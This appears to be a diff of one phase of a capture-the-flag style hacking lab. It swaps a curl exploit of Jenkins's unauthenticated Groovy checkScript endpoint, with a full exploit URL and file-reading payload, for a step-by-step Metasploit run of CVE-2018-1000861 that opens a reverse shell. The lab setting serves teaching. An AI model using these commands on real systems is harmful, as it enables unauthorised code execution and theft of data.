@@ -1,51 +1,83 @@
 PHASE 3 — OPERATIONS
 ════════════════════
-tool:  curl   (yes, just curl)
+tool:  msfconsole
 
-You found the bug in phase 2: jenkins-old serves the
-descriptorByName/checkScript endpoint without authentication, and
-it actually evaluates expressions sent in the `value` parameter.
-That's the door. Now we walk through it.
+You found the bug in phase 2: CVE-2018-1000861, unauth RCE in
+Jenkins 2.121.1. Now we walk through it.
 
-The blueprint we want is stored on jenkins-old at:
+The blueprint we want is on the Jenkins host at:
 
     /var/m0use/blueprint.txt
 
-Your job: use the unauth Groovy endpoint to read that file and
-print its contents back to your screen. Then submit the flag from
-inside the file.
+Your job: use the metasploit module for this CVE to pop a shell on
+the Jenkins box, read that file, and submit the flag from inside.
 
 
-THE EXPLOIT, IN PLAIN ENGLISH
-─────────────────────────────
-The vulnerable endpoint accepts a parameter called `value`. Whatever
-you put in `value`, the server evaluates as Groovy code and prints
-the result. So if you ask it to read a file, it'll read the file.
+THE METASPLOIT WORKFLOW
+───────────────────────
+Same pattern for any CVE you'll ever exploit with metasploit:
 
-A Groovy expression that reads a file's contents:
+    1. search        find the module by CVE id
+    2. use           select it
+    3. show options  see what params it needs
+    4. set RHOSTS    point it at the target
+    5. set LHOST     your callback address (for the reverse shell)
+    6. check         confirm the target is actually vulnerable
+    7. exploit       fire it; if it works, you get a shell
 
-    new File("/var/m0use/blueprint.txt").text
 
-You need to pass that expression as the `value=` parameter on the
-checkScript URL. Spaces and quotes have to be URL-encoded.
+YOUR FIRST RUN
+──────────────
+Start metasploit:
 
+    msfconsole
 
-YOUR FIRST CURL
-───────────────
-Try this — start small. Ask the server to print a number:
+That drops you into the metasploit REPL. The prompt changes from
+your normal shell prompt to:
 
-    curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(42)'
+    msf6 >
 
-That URL is one continuous string, no spaces. If it works you'll
-see "Result: 42" — proof the server evaluated your code without
-asking who you were.
+Now look up the module for CVE-2018-1000861:
 
-Now do the same thing but ask it to read the blueprint file.
+    search CVE-2018-1000861
 
-Read the response carefully. The flag is inside the file's text.
-Type it straight at the prompt and hit Enter — same as before, no
-keyword needed.
+It'll show one matching module. Load it:
 
-    <the-flag-string>
+    use 0
+
+The prompt now shows which module you're in. Check what options
+it needs:
+
+    show options
+
+You'll see RHOSTS (target host) and LHOST (your callback) are
+required and empty. Set them:
+
+    set RHOSTS 10.4.12.1
+    set LHOST 10.4.12.99
+
+Confirm the target is actually vulnerable before firing:
+
+    check
+
+If check returns "The target is vulnerable", fire:
+
+    exploit
+
+Metasploit sends the payload, opens a reverse shell back to you,
+and drops you onto the target. The prompt goes blank — you're now
+typing commands AS the jenkins user on the Jenkins box.
+
+Read the blueprint:
+
+    cat /var/m0use/blueprint.txt
+
+The flag is in the file's text. When you have it, type:
+
+    exit
+
+That returns you to the msfconsole prompt. Type `exit` again to
+leave metasploit entirely. Then type the flag at the m0usenet
+prompt to advance.
 
 Stuck?  cat hint  — no penalty.
